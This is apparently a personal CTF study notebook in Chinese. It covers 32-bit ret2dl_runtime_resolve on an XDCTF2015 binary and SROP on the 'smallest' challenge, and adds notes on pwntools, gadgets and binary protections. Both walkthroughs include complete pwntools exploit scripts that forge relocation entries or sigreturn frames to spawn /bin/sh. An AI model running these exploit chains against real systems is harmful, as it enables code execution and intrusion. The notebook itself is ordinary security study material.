![image-20240315195720188](${images}/image-20240315195720188.png)



迁移.dynstr可以分为两步：

- 部署write函数的字符串"write\x00"
- 更改write函数在.dynsym的第一结构体成员变量st_name的值



**部署write函数的字符串”write\x00“**  

上一步把.dynsym放置在了base_stage+0x20的位置，但由于对齐，需要填充8字节，也就是实际上写.dynsym结构体的起始位置应该是：fake_sym_addr = base_stage + 0x28，由于.dynsym的结构体占16字节所以从fake_sym_addr+0x10的位置部署write函数的字符串"write\x00"

write后加\x00是因为.synstr中每一段字符串都以\x00结尾。



**更改st_name**

上面提过.dynsym是Elf32_Sym结构体，这个结构体的第一个成员变量st_name代表着相对.dynstr起始的位移，因此，如果需要部署.dynstr的话，st_name就必须更改，更改的值取决于想要在新栈中摆放.dynstr的位置，在上一步确认的摆放位置，那么还是用之前的公式划等式

```
st_name + .dynstr = fake_sym_addr + 0x10
```

需要的是st_name，因此将等式变化：

```
st_name = fake_sym_addr + 0x10 - .dynstr
```

这样一来，部署在.dynsym的结构体的内容就可以写为

```
fake_write_sym = flat([st_name],0,0,0x12)
```

给出此步骤的栈布局

```
      低地址位 	
		    +---------------------+
	  0x00  |        plt0         |  <----ret
			+---------------------+
      0x04  |    index_offset     | 伪造的.rel.plt的结构体偏移
       	    +---------------------+
      0x08  |        bbbb         | write函数返回地址
       		+---------------------+
      0x0c  |          1          | write函数1参
       		+---------------------+
      0x10  |     /bin/sh地址      | write函数2参，/bin/sh字符串所在地址
       		+---------------------+                 
      0x14  |          7          | write函数3参     
       		+---------------------+   
      0x18  |      r_offset       | 伪造的.rel.plt的结构体成员r_offset
            +---------------------+
      0x1c  |       r_info        | 伪造的.rel.plt的结构体成员r_info
            +---------------------+
      0x20  |        aaaa         |  对齐
       		+---------------------+
      0x24  |        aaaa         |  对齐
       		+---------------------+
      0x28  |       st_name       |  伪造的.dynsym的结构体的成员变量st_name
      		+---------------------+
      0x2c  |       st_value      |  伪造的.dynsym的结构体的成员变量st_value
      		+---------------------+
      0x30  |       st_size       |  伪造的.dynsym的结构体的成员变量st_size
      		+---------------------+
      0x34  |       st_info       |  伪造的.dynsym的结构体的成员变量st_info
       		+---------------------+  
      0x34  |        writ         |  伪造的.dynstr：write\x00
            +---------------------+
      0x34  |       e\x00         | 
       		+---------------------+
       		|        aaaa         |  填充          
       		|        ....         |  填充          
       		|        aaaa         |  填充            
       		+---------------------+                
      0x50	|      /bin/sh        | /bin/sh字符串
       		+---------------------+ 
       		|        aaaa         |
       		|        ....         |              
       		|        aaaa         |           
   高地址位  +---------------------+

```

代码为：

```
#获取plt[0]地址
plt0 = elf.get_section_by_name('.plt').header.sh_addr
#获取.rel.plt地址
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
#获取.dynsym的基地址
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
#获取.dynstr的基地址
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

#在base_stage + 32的地方开始部署.dynsym结构体
fake_sym_addr = base_stage + 32
#对齐
Align = 0x10 - ((fake_sym_addr - dynsym) & 0xf )
fake_sym_addr = fake_sym_addr + Align
fake_write_sym = flat([0x54,0,0,0x12]) #伪造的.dynsym结构体
#计算.dynsym结构体下标
index_dynsym = int((fake_sym_addr - dynsym) / 0x10)

#计算.dynstr偏移准备更改.dynsym成员变量st_name
st_name = fake_sym_addr + 0x10 - dynstr
fake_write_sym = flat([st_name,0,0,0x12]) #伪造的.dynsym结构体

#那么在base_stage + 24的位置存放伪造结构体，并计算index_offset
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']

#由.dynsym下标反推r_info
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got,r_info])

#r_info = 0x507
 
#计算write函数的reloc_index
write_reloc_index = (elf.plt['write'] - plt0) / 16 - 1
#因为索引不能为float，那么修改成int即可
write_reloc_index = int(write_reloc_index) * 8




rop.raw(plt0)
#rop.raw(write_reloc_index)
rop.raw(index_offset)

#伪造write函数的ret addr
rop.raw('bbbb') #write函数的返回地址
rop.raw(1) #write函数的第一个参数
rop.raw(base_stage + 80) #write函数的第二个参数
rop.raw(len(sh)) #write函数的第三个参数
rop.raw(fake_write_reloc) #伪造的.rel.plt的结构体
rop.raw('a' * Align) #对齐
rop.raw(fake_write_sym) #伪造的.dynsym的结构体
rop.raw('write\x00')# 伪造的.dynstr
#rop.raw(write_got)
#rop.raw(r_info)
# rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
#print(rop.dump())#可查看栈布局


# 发送此次利用链
p.sendline(rop.chain())
p.interactive()
```

结果为：

![image-20240315202154229](${images}/image-20240315202154229.png)



最后一步、换write函数为system

前些步骤将栈迁移，对.rel.plt的迁移、对.dynstr的迁移。都是对write函数进行实验，并通过前面的各部分的验证，证明/bin/sh字符串可以作为一个函数的参数使用。那么着部分我们就可以将write函数替换成system函数了，替换之后如果不出意外，那就执行exp后可获取shell

**替换system函数**

这一部分在前面的基础上只需要将部署在.dynstr位置的“write\x00”替换成“system\x00”就可以了，所以直接就给出栈布局吧

```
      低地址位 	
		    +---------------------+
	  0x00  |        plt0         |  <----ret
			+---------------------+
      0x04  |    index_offset     | 伪造的.rel.plt的结构体偏移
       	    +---------------------+
      0x08  |        bbbb         | write函数返回地址
       		+---------------------+
      0x0c  |          1          | write函数1参
       		+---------------------+
      0x10  |     /bin/sh地址      | write函数2参，/bin/sh字符串所在地址
       		+---------------------+                 
      0x14  |          7          | write函数3参     
       		+---------------------+   
      0x18  |      r_offset       | 伪造的.rel.plt的结构体成员r_offset
            +---------------------+
      0x1c  |       r_info        | 伪造的.rel.plt的结构体成员r_info
            +---------------------+
      0x20  |        aaaa         |  对齐
       		+---------------------+
      0x24  |        aaaa         |  对齐
       		+---------------------+
      0x28  |       st_name       |  伪造的.dynsym的结构体的成员变量st_name
      		+---------------------+
      0x2c  |       st_value      |  伪造的.dynsym的结构体的成员变量st_value
      		+---------------------+
      0x30  |       st_size       |  伪造的.dynsym的结构体的成员变量st_size
      		+---------------------+
      0x34  |       st_info       |  伪造的.dynsym的结构体的成员变量st_info
       		+---------------------+  
      0x34  |        syst         |  伪造的.dynstr：system\x00
            +---------------------+
      0x34  |       em\x00        | 
       		+---------------------+
       		|        aaaa         |  填充          
       		|        ....         |  填充          
       		|        aaaa         |  填充            
       		+---------------------+                
      0x50	|      /bin/sh        | /bin/sh字符串
       		+---------------------+ 
       		|        aaaa         |
       		|        ....         |              
       		|        aaaa         |           
   高地址位  +---------------------+

```



最终代码：

```python
from pwn import *

#这里是获取elf的相关信息
elf = ELF('main')
p = process('./main')
rop = ROP('./main') #方便实现ROP链

offset = 112  #这是之前得到的溢出所需的字节
bss_addr = elf.bss() #获取.bss段首地址

p.recvuntil(b'Welcome to XDCTF2015~!\n')

"""1、栈迁移到.bss段"""
# 设置新栈的大小为0x800
stack_size = 0x800
# 设置栈的首地址
base_stage = bss_addr + stack_size
# 因为.bss段的特殊，所以由高向低写（也可能是错的）


# 填充缓冲区
rop.raw(b'a' * offset)
# 向新栈写入100字节
# rop.read()可以自动完成刚刚说的read函数，函数参数，返回地址的栈部署
rop.read(0, base_stage, 100)

# 开始栈迁移
# 即设置 esp = base_stage
# rop.migrate(base_stage)会利用leave_ret自动完成部署迁移工作
rop.migrate(base_stage)
p.sendline(rop.chain())


"""2、"/bin/sh"字符串"""
rop = ROP('./main')
sh = b"/bin/sh\x00"

"""3、获取三大神器"""
#获取plt[0]地址
plt0 = elf.get_section_by_name('.plt').header.sh_addr
#获取.rel.plt地址
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
#获取.dynsym的基地址
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
#获取.dynstr的基地址
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

"""4、部署fake .dynsym结构体"""
#在base_stage + 32的地方开始部署.dynsym结构体
fake_sym_addr = base_stage + 32
#对齐
Align = 0x10 - ((fake_sym_addr - dynsym) & 0xf )
fake_sym_addr = fake_sym_addr + Align
#计算.dynsym结构体下标
index_dynsym = int((fake_sym_addr - dynsym) / 0x10)

#计算.dynstr偏移准备更改.dynsym成员变量st_name
st_name = fake_sym_addr + 0x10 - dynstr
fake_write_sym = flat([st_name,0,0,0x12]) #伪造的.dynsym结构体

##那么在base_stage + 24的位置存放伪造结构体，并计算index_offset
#在base_stage+24的位置开始部署.rel.plt的结构体
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']

#由.dynsym下标反推r_info
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got,r_info])

rop.raw(plt0)
rop.raw(index_offset)

#伪造write函数的ret addr
rop.raw(b'bbbb')# system函数的返回地址
rop.raw(base_stage + 80)#system参数一
rop.raw(b'bbbb')# system参数二
rop.raw(b'bbbb')# system参数三
rop.raw(fake_write_reloc) #伪造的.rel.plt的结构体
rop.raw(b'a' * Align) #对齐
rop.raw(fake_write_sym) #伪造的.dynsym的结构体
rop.raw(b'system\x00')

rop.raw(b'a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw(b'a' * (100 - len(rop.chain())))
print(rop.dump())#可查看栈布局

# 发送此次利用链
p.sendline(rop.chain())
p.interactive()
```

[好好说话之ret2_dl_runtime_resolve_ret2dlruntime-CSDN博客](https://blog.csdn.net/qq_41202237/article/details/107378159?spm=1001.2014.3001.5501)



#### 来自CTFHub的题

首先在IDA查看一下代码内容（先使用gdb查看checksec一下）：

![image-20240314194029590](${images}/image-20240314194029590.png)

![image-20240314194036954](${images}/image-20240314194036954.png)



没有什么好的后门，以及超大的栈溢出0x1000u



那么根据题目提示，且Partial RELRO，可以使用dl_resolve



### 1、（9）SROP-Vdso

[360 春秋杯中的 smallest-pwn](https://github.com/Reshahar/BlogFile/blob/master/smallest/smallest)

![image-20240415184208209](${images}/image-20240415184208209.png)



IDA反编译

![image-20240415184309916](${images}/image-20240415184309916.png)

可以看到，显示了sys_read的样式，因为syscall的编号为0

F5后

![image-20240415184352190](${images}/image-20240415184352190.png)



注意到汇编模式下

edx的值为400h，那么实际上也就是

read(0,$rsp,400)，朝栈顶写入400字符，而我们写入的地址是：rsp和rsi

read函数不进行限制就会存在栈溢出漏洞，我们可以超限输入数据，比如这里的400，我们可以输入410都可以

#### 利用思路

程序没有sigreturn的调用，因此需要自己构造，可以借用read函数读取的字符数来设置rax的值

1. 控制read读取的字符数设置RAX的值，从而执行sigreturn
2. 通过syscall执行execve("/bin/sh",0,0)来获取shell



ret会弹出函数栈帧，并将栈顶的内容作为返回地址加载到指令指针 (rip) 中，同时恢复栈指针 (rsp)



rax寄存器在系统调用返回时将包含以下信息：

- 如果系统调用成功执行，则rax寄存器中将存放返回的结果或返回码。返回值的具体含义取决于所调用的系统调用。
- 如果系统调用发生错误或失败，则rax寄存器中会存放一个负数，表示错误的错误码。错误码可以通过errno全局变量来获取。



因此，需要跳过第一行的代码，以及让ret返回正确的地址



#### edb调试

![image-20240416103203537](${images}/image-20240416103203537.png)

这六行代码对应着IDA的汇编代码

在syscall处暂停，运行到此

![image-20240416103531947](${images}/image-20240416103531947.png)

![image-20240416103555215](${images}/image-20240416103555215.png)

发现了调用的是read函数，和IDA反汇编结果对应

在input窗口里，随便输入数据：

![image-20240416103737044](${images}/image-20240416103737044.png)

可以看到进行到下一步了(F7)，也就是ret处，并且注意到rip和rsp的值指向刚才输入的地址

![image-20240416103859316](${images}/image-20240416103859316.png)

![image-20240416105510116](${images}/image-20240416105510116.png)

并且存储的内容为0xa333231,对应着(\n)(3)(2)(1)（小端序形式）

在下一步就会退出

![image-20240416105633128](${images}/image-20240416105633128.png)

提示地址没有被映射，也就是ret无法正常返回，这里rip的指针和rsp的指针在ret的时候，就会更新，将栈顶元素的地址作为rip和rsp的地址，然后ret到rip的地址，rsp更新指向最新的栈顶位置

**那么我们可以稍微对输入的内容进行修改：**

![image-20240416110235308](${images}/image-20240416110235308.png)

CTRL+E

将其hex内容修改为b0 00 40 00 00 00 00 00

![image-20240416110337038](${images}/image-20240416110337038.png)

修改之前![image-20240416110515437](${images}/image-20240416110515437.png)

修改之后

![image-20240416110539808](${images}/image-20240416110539808.png)

![image-20240416110612628](${images}/image-20240416110612628.png)

可以看到成功指向程序开始的地方

也可以看到RAX为我们保存的字符数(123\n)(4个)，因为read函数会返回读取的字符数到rax

RCX指向ret的地址

![image-20240416110700303](${images}/image-20240416110700303.png)

此时再下一步就会返回到RIP所指的地址了，rsp更新一个指针的大小，然后rsi存储此时字符串的地址

![image-20240416111253122](${images}/image-20240416111253122.png)

查阅资料得知：
![image-20240416170806488](${images}/image-20240416170806488.png)

![image-20240416170831194](${images}/image-20240416170831194.png)

那么我们使用read函数更改rax为1，就可以syscall write了，这样子，我们就可以暴露栈的地址以及内容了

![image-20240416171130398](${images}/image-20240416171130398.png)

#### 暴露栈首

```python
from pwn import *
from pwn import p64
from pwn import u64

p = process('./smallest')
# context.log_level = 'debug'
start_addr = p64(0x4000B0)
#skip_xor = 0x4000B3
# 发送三次 start_addr,rsp即为b0 00 40 00 00 00 00 00 b0 00 40 00 00 00 00 00
p.send(start_addr * 3)
#此时再次返回start_addr，rsp移动一个指针的距离，此时rsp为b0 00 40 00 00 00 00 00
#发送一个字节，也就是修改b0为b3
p.send(b'\xb3')
#此时rsp指向的是我们推进去的第二个start_addr，那么我们修改的就是最后一个字节，更改为b3，这样子，达成了跳过xor，又输入单字符
#此时运行的是syscall(1,0,rsp,0x400)
#也就是write(0,rsp,0x400)
data = p.recv()
# print(data)
#接收栈顶后的400字节内容
#rsp继续移动，
#最后返回到start_addr
new_stack_top = u64(data[8:16])
log.success("暴露出的地址为："+hex(new_stack_top))
```



edb上操作为：只输入一个回车，这样就达到了输入单字符的目的：

将Stack Top修改为0x4000B3，避免rax被修改为0；

![image-20240416172816461](${images}/image-20240416172816461.png)

此时调用的就是write方法

会暴露栈的内容

edb的输出框，看不出什么东西，也导出不了，可以使用python的脚本试试，就可以定制内容输出了

![image-20240416172908847](${images}/image-20240416172908847.png)

![image-20240416182448590](${images}/image-20240416182448590.png)

得到了一堆的数据，不怕，我们通过edb可以得知，我们打印的就是从栈顶开始以及后的字节（总共0x400），那么我们不能把接下来的地址覆盖我们还需要rsp，因此，新的栈顶应该为：除去开头的8字节，后的8字节

![image-20240416182548640](${images}/image-20240416182548640.png)

![image-20240416183750770](${images}/image-20240416183750770.png)

接下来就到了Sigreturn的内容了，edb可以关闭了



#### 构建Sigreturn Frame of read

在[PS、其他知识介绍]()可以了解到Frame的结构：

简化版如下：

```
----------------------------------
| 寄存器和指令 |      存储数据      | 
----------------------------------
|    rax     |  read函数系统调用号 | 
----------------------------------
|    rdi     |         0         | 
----------------------------------
|    rsi     |    stack_addr     | 
----------------------------------
|    rdx     |       0x400       | 
----------------------------------
|    rsp     |    stack_addr     | 
----------------------------------
|    rip     |    syscall_ret    | 
----------------------------------
```

那么不难构建出：

```
syscall_ret = 0x4000BE
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = new_stack_top
sigframe.rdx = 0x400
sigframe.rsp = new_stack_top
sigframe.rip = syscall_ret
payload = p64(new_stack_top) + b'a' * 8 + bytes(sigframe)#加8字节为了在栈顶和数据间加入syscall_ret
p.send(payload)
```

将这个结构放入新栈顶，将payload放入，两次ret后

差不多此时的栈就如此

|        |   frame(read)   |       |
| :----: | :-------------: | :---- |
|        | **syscall_ret** |       |
|        |    0x4000B0     | <-rsp |
| start3 |    0x4000B0     |       |
| start2 |    0x4000B3     |       |
| start1 |    0x4000B0     |       |

再次利用read函数将rax设置到15，调用sigreturn

```
sigreturn = p64(syscall_ret) + b'b' * 7
#我们最后的字节为就是syscall_ret，那么我们此时将源数据覆盖源数据(8字节)再加上7即可设置为15
p.send(sigreturn)
```

注意的是这个时候调用的read函数并不再是在栈中部署的start_addr了，而是通过寄存器里面的值进行调用的

差不多此时的栈就如此

|        |   frame(read)   |       |
| :----: | :-------------: | :---- |
|        | **syscall_ret** | <-rsp |
|        |    0x4000B0     |       |
| start3 |    0x4000B0     |       |
| start2 |    0x4000B3     |       |
| start1 |    0x4000B0     |       |

ret位返回到的是syscall，越过了源代码中对寄存器的值操作的部分，直接进行系统调用 由于我们需要知道接下来需要部署到哪个位置，前面write函数泄露了一个可控的栈地址new_stack_top，所以read函数的二参需 要填写new_stack_top

此时调用sigreturn，就能将栈中的内容还原到对应寄存器



#### 构建Sigreturn Frame of evecve

此时我们需要一点小的区别：

- execve函数的调用我们只需要对rdi寄存器部署，存放/bin/sh字符串所在地址就可以了，rsi寄存器和rdx寄存器置零就可以了

- 不止需要对execve函数所用的寄存器进行部署，还需要考虑/bin/sh字符串放在哪个位置

- 由于前面在部署read函数寄存器的时候rsi寄存器中的值为之前write函数泄露出来的new_stack_top，所以这次的位置是从new_stack_top开始写的

```
----------------------------------
| 寄存器和指令 |      存储数据      | 
----------------------------------
|    rax     | execve函数系统调用号| 
----------------------------------
|    rdi     |     binsh_addr    | 
----------------------------------
|    rsi     |         0         | 
----------------------------------
|    rdx     |         0         | 
----------------------------------
|    rsp     |    stack_addr     | 
----------------------------------
|    rip     |    syscall_ret    | 
----------------------------------
```

那么接下来只剩"/bin/sh"字符串了，我们部署到一个合适的位置即可，这时候我们需要得知frame的大概大小

那么只需打印即可

此时的payload

```python
context.arch = 'amd64'
syscall_ret = 0x4000BE
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = new_stack_top
sigframe.rdx = 0x400
sigframe.rsp = new_stack_top
sigframe.rip = syscall_ret
payload = start_addr + b'a' * 8 + bytes(sigframe)
p.send(payload)

## 设置rax=15，调用sigreturn
sigreturn = p64(syscall_ret) + b'b' * 7
p.send(sigreturn)


#再次读取构造 sigreturn 调用，进而将向栈地址所在位置读入数据，构造 execve('/bin/sh',0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = new_stack_top + 0x120  # "/bin/sh"的地址
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = new_stack_top
sigframe.rip = syscall_ret

# 再次读取构造 sigreturn 调用，从而获取 shell。
frame_payload = start_addr + b'b' * 8 + bytes(sigframe)
print(len(frame_payload))
```

![image-20240416190632900](${images}/image-20240416190632900.png)

264=0x108，那么我们放0x120后即可，凑整，120%8=0![image-20240416190710987](${images}/image-20240416190710987.png)

payload就需要更改一下了，因为我们的/bin/sh字符串要同payload一起写进栈中，那么/bin/sh字符串前面的空位就需要填充一下：

```
payload = frame_payload + (0x120 - len(frame_payload)) * b'\x00' + b'/bin/sh\x00'
```

最后发送payload和调用sigret即可

```
sh.send(payload)
sh.send(sigreturn)
sh.interactive()
```

![image-20240416191022674](${images}/image-20240416191022674.png)



### 1、（10）花式栈溢出



#### stack pivoting



## PS、其他知识介绍



### 做题方法

几个大方向的思路：
没有[PIE](https://so.csdn.net/so/search?q=PIE&spm=1001.2101.3001.7020)：ret2libc

有PIE：SROP，Vdso

NX关闭：ret2shellcode
其他思路：ret2csu、ret2text 【程序本身有[shellcode](https://so.csdn.net/so/search?q=shellcode&spm=1001.2101.3001.7020)】、ret2dl_resolve



### 什么是gadget

"gadget" 指的是一系列已经存在于程序中的连续的机器指令序列，这些指令通常由程序中的代码段（code section）中的一部分组成。这些指令序列通常是程序中已有的代码片段，而不是新插入的代码。"gadget" 是 "Return-Oriented Programming"（ROP）攻击的核心概念之一。

在 ROP 攻击中，攻击者会利用程序中已有的这些"gadget"来构造一个称为 ROP 链的执行路径，绕过一些安全保护机制（如栈随机化、数据执行保护等），并达到执行恶意代码的目的。

一个"gadget"通常由几条指令组成，这些指令包括：

- 一个返回指令（return instruction），通常是 `ret` 或者 `retq`，用于从函数调用返回。
- 一些指令，这些指令可以在函数调用后恢复栈的状态，以达到控制流跳转的目的。

例如，在一个受漏洞影响的程序中，攻击者可能会利用这些"gadget"来构造一个 ROP 链，以实现执行特定的系统调用或者加载恶意代码。



### 各函数汇编层下的代码

#### open

32位

```assembly
lea eax, [aExampleTxt + ebx] ; 将文件名字符串的地址加载到eax寄存器
push eax                      ; 将文件名字符串的地址压入栈中作为参数
push 0                        ; 将文件打开的标志参数压入栈中
call _open                    ; 调用_open函数
add esp, 10h                  ; 调整栈指针
mov [ebp + fd], eax           ; 将返回的文件描述符保存到fd变量中
```

64位

```assembly
lea rax, [rip + file]   ; 将文件名字符串的地址加载到rax寄存器
mov rdi, rax            ; 将文件名字符串的地址传递给第一个参数
mov eax, 0              ; 将文件打开的标志参数加载到eax寄存器
call _open              ; 调用_open函数
```

32位和64位不同之处：

##### 如何利用open函数构造payload？

###### 32位

> 只需要对应栈推入即可

```python
from pwn import *

# 构造32位环境的payload
payload = b""
payload += p32(0x804842b)  # open函数地址，假设在程序中的地址为0x804842b
payload += p32(0x804a030)  # 文件名字符串地址，假设为0x804a030
payload += p32(0)          # 打开文件的标志，这里假设为0，表示只读模式

# 发送payload
r = process("./your_binary")
r.sendline(payload)
print(r.recvall())
```

###### 64位

> 需要处理rdi寄存器
>
> 注意的是寄存器需要带有ret，否则时效

```python
from pwn import *

# 构造64位环境的payload
payload = b""
payload += p64(0x4005d0)   # open函数地址，假设在程序中的地址为0x4005d0
payload += p64(0x600b60)   # 文件名字符串地址，假设为0x600b60，存放在rdi寄存器中
payload += p64(0)          # 打开文件的标志，这里假设为0，表示只读模式
payload += p64(0)          # 在64位环境下，通常需要一个额外的参数占位，用来保持栈对齐

# 发送payload
r = process("./your_binary")
r.sendline(payload)
print(r.recvall())
```

#### write

32位

```assembly
sub esp, 4
push 0Eh
push [ebp+buf]
push 1
call _write
add esp, 10h
```

64位

```assembly
mov rax,[rbp+buf]
mov edx,0Eh
mov rsi,rax
mov edi,1
call _write
```

#### read

```
ssize_t read(int fd, void *buf, size_t count);
```

payload参照open来

32位

```assembly
sub     esp, 4
push    100h            ; 将要读取的最大字节数压入栈中
lea     eax, [ebp+buf]  ; 将 buf 的地址加载到 eax 寄存器中
push    eax             ; 将 buf 的地址压入栈中
push    0               ; 将文件描述符为标准输入的值压入栈中
call    _read           ; 调用 read 函数
add     esp, 10h        ; 调整栈指针
mov     [ebp+var_C], eax; 将返回值（读取的字节数）保存到 var_C 变量中
```

64位

```assembly
lea     rax, [rbp+buf]    ; 将 buf 的地址加载到 rax 寄存器中
mov     edx, 100h         ; 将读取的最大字节数加载到 edx 寄存器中
mov     rsi, rax          ; 将 buf 的地址传递给 rsi 寄存器
mov     edi, 0            ; 将文件描述符为标准输入的值传递给 edi 寄存器
call    _read             ; 调用 read 函数
```

#### system

32位

```assembly
push    edx             ; command
mov     ebx, eax
call    _system
```

64位

```assembly
lea     rax, command    ; "ls"
mov     rdi, rax        ; command
call    _system
```

#### printf

64位

```assembly
mov rdi, rax      ; 将字符串地址（Hello, world!\n）移到 rdi 寄存器，rdi 是作为第一个参数传递给函数的。
call _puts        ; 调用 _puts 函数（通常用于输出字符串），参数是 rdi 中的地址。
```

32位

```assembly
mov     ebx, eax
call    _puts
```

#### puts

64位

```assembly
mov rdi, rax      ; 将字符串地址（Hello, world!\n）移到 rdi 寄存器，rdi 是作为第一个参数传递给函数的。
call _puts        ; 调用 _puts 函数（通常用于输出字符串），参数是 rdi 中的地址。
```

32位

```assembly
mov     ebx, eax
call    _puts
```

#### alarm

```assembly
mov edi,5         ; 设置定时器时间为5秒
call _alarm       ; 调用alarm函数
```



#### gets



#### strlen

32位

```
sub     esp, 0Ch
lea     eax, [ebp+s]
push    eax             ; s
call    _strlen
```



#### strcpy

32位

```
sub     esp, 8
lea     eax, [ebp+src]
push    eax             ; src
lea     eax, [ebp+dest]
push    eax             ; dest
call    _strcpy
```



### pwndbg的使用指南

[[pwn\]调试：gdb+pwndbg食用指南_pwngdb和gdb是一个东西吗-CSDN博客](https://blog.csdn.net/Breeze_CAT/article/details/103789233)



### python中pwn库所用类

#### ELF类

> 该类用于表示 ELF 文件，可以加载一个 ELF 文件并提供访问其各个部分的方法。通过这个类，可以方便地获取 ELF 文件的头部信息、节表信息、符号表信息等。



###### from_bytes方法

> 用于从字节流里解析出ELF文件对象。



###### get_section_by_name方法

> 通过指定节的名称，可获取到节的信息，大小、偏移等



###### search方法

> 用于在ELF文件中指定字节序列，用于漏洞寻找特定的代码模式或者标记



###### symbol属性

> 返回一个字典，包含文件中的所有符号以及对应的地址



###### got属性

> 返回一个质点，包含ELF文件中的全局偏移表(GOT)中的所有项以及对应的地址



#### PROCESS函数

基本语法

```
pwn.process(argv, *a, **kw)
```

参数说明：

- `argv`: 是一个字符串列表，表示要执行的程序及其参数。第一个元素通常是程序的路径，随后的元素是程序的参数。
- `*a` 和 `**kw`: 可选的其他参数，可以用来控制创建子进程的行为。

`process()` 函数返回一个 `pwnlib.tubes.process.process()` 对象，该对象代表了创建的子进程，可以通过它与程序进行交互。



#### sendline()函数

用于向目标程序发送数据并添加一个换行符 `\n`



#### interactive()

程序将进入一个交互式的命令行界面，允许用户手动输入命令与目标程序进行交互



#### recvuntil()

接收目标程序的输出直到某个特定的字符串出现为止。通常用于从目标程序中接收需要的数据，直到某个特定的标记或提示符出现，以便后续对数据进行处理或分析。



#### ROP类

在 `pwn` 库中，`ROP` 类是用于构造 Return-Oriented Programming (ROP) [面向回报的编程]链的工具，它提供了一系列属性和方法，用于添加 gadgets 和构建 ROP 链。下面是 `ROP` 类的主要属性和方法：



这里主要是我自己收集的：

##### ELF文件中所有的库的函数

​		例如read，write，用于构建ROP链



##### rop.migrate(base_stage)

> ​		函数的作用是明确地设置栈指针（$sp），通过使用一个`leave; ret`的gadget来实现。在x86架构的汇编语言中，`leave`指令用于恢复栈帧，并将栈指针（$sp）设置为栈帧的基地址，然后`ret`指令用于返回到调用者。通过使用这个gadget，可以确保栈指针的正确设置，并实现控制流的迁移。

​		具体来说，`rop.migrate(base_stage)`函数可能会在ROP链中添加一系列的指令，以实现以下功能：

1. 将栈指针（$sp）设置为`base_stage`地址。
2. 使用`ret`指令返回到`base_stage`地址。

​		这样，执行流就会从`rop.migrate(base_stage)`函数返回后转移到`base_stage`地址处，从而实现了控制流的迁移。这种方式通常用于漏洞利用中，特别是在需要跳转到自定义的代码区域执行恶意代码时。



##### rop.row()

> ROP链中添加一个原始的字节序列，通常用于填充偏移量或者插入任意的机器码指令



##### row.chain()

> 用于生成当前构建的 ROP 链，并以字节序列的形式返回。这个字节序列可以直接用于向目标程序发送。
>
> 在利用漏洞进行攻击时，通常需要构建一个 ROP 链，以利用目标程序中已有的代码片段来实现攻击目标。`rop.chain()` 方法会将之前构建的 ROP 链转换成字节序列，并返回给调用者



### objdump的简述

`objdump` 是一个用于检查目标文件（如可执行文件、共享库、目标文件等）内容的工具。它通常用于分析和调试编译后的程序。`objdump` 可以显示目标文件的各种信息，包括可执行指令、代码段、数据段、符号表、重定位信息等。通过 `objdump`，开发人员可以深入了解程序的内部结构，帮助进行调试、性能优化以及理解程序的工作原理。

常见用途包括：

1. **反汇编（Disassembly）**：`objdump` 可以将二进制文件中的机器代码反汇编为汇编代码，使开发人员能够查看程序的实际指令内容。
2. **查看符号表（Symbol Table）**：`objdump` 可以显示目标文件中定义的符号，包括函数名、变量名等信息。
3. **查看节表（Section Table）**：`objdump` 可以列出目标文件的各个节（sections），包括代码段、数据段等。
4. **查看重定位表（Relocation Table）**：`objdump` 可以显示目标文件的重定位信息，帮助理解程序的地址空间布局。
5. **查看头部信息（Header Information）**：`objdump` 可以显示目标文件的头部信息，包括文件类型、目标体系结构、入口点等。

总之，`objdump` 是一个强大的工具，可以帮助开发人员深入了解目标文件的内部结构，从而进行调试、优化和理解程序的工作原理。



### checksec获取的参数的详解

![image-20240313162536569](${images}/image-20240313162536569.png)



#### Arch

> ​		程序架构信息。判断使用IDA64还是IDA32，以及p64还是p32函数



#### RELRO

> ​		Relocation Read-Only (RELRO)  此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。
>  ​		部分RELRO 易受到攻击，例如攻击者可以**atoi.got为system.plt，进而输入/bin/sh\x00获得shell**完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。



#### Stack-Canary

> ​		栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。



#### NX

> ​		NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过



#### PIE

> ​		PIE(Position-Independent Executable, 位置无关可执行文件)技术与 ASLR 技术类似,ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。这就意味着, 在 PIE 和 ASLR 同时开启的情况下, 攻击者将对程序的内存布局一无所知, 传统的改写GOT 表项的方法也难以进行, 因为攻击者不能获得程序的.got 段的虚地址。若开启一般需在攻击时泄露地址信息



#### RWX

> Read Write Execute(可读、可写、可执行)



### PLT表和GOT表

PLT（Procedure Linkage Table）**过程链接表**存放函数地址的数据段称为GOT（Global Offset Table）**全局偏移表**

> 前面存放函数所在函数表的地址，后面存放函数的真实地址



### 栈溢出原理

